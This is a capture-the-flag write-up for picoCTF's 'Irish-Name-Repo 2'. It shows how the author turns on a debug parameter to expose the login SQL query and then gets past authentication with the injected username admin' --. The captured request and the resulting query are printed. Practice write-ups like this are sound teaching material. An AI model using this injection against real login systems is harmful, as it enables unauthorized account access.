# Irish-Name-Repo 2

## Description

There is a website running at `https://jupiter.challenges.picoctf.org/problem/52849/` ([link](https://jupiter.challenges.picoctf.org/problem/52849/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:52849

#### Hints:

- The password is being filtered.

## Solution

The link opens up to a website as shown below...

![homepage](assets/1.png)

The description says to login to the page. The sidebar option in the corner allows us to move to a login page as shown below...

![loginpage](assets/2.png)

I tried using credentials `username: admin, password: admin` and the website said login failed.

![fail1](assets/3.png)

 I logged the POST request sent.

```
POST /login.php HTTP/1.1
Host: jupiter.challenges.picoctf.org:52849
Content-Length: 37
Cache-Control: max-age=0
Accept-Language: en-GB
Upgrade-Insecure-Requests: 1
Origin: http://jupiter.challenges.picoctf.org:52849
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://jupiter.challenges.picoctf.org:52849/login.html
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=admin&password=admin&debug=0
```

I noticed a `debug` value being submit as `0` so I tried to intecept the request and changed the `debug` value to `1`. The login failed again but the change in the `debug` value caused the website to display the query being used in its database.

![query](assets/4.png)

This means that I can perform an SQL injection easily to login to the website. I tried to login using username `admin' --` and arbitrary password and login was successful. The website gave me the flag.

The SQL query being used would then be `SELECT * FROM users WHERE name='admin' --' AND password='{arbitrary password}'`. The password field gets commented out and only the username being `admin` is used in the query.

![flag](assets/5.png)
